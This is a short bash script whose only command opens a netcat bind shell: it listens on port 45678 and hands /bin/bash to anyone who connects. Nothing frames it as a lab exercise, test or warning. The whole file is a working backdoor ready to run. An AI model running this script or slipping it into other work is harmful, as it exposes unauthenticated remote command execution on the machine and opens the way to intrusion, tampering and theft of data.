#!/bin/bash

nc -l -p 45678 -e /bin/bash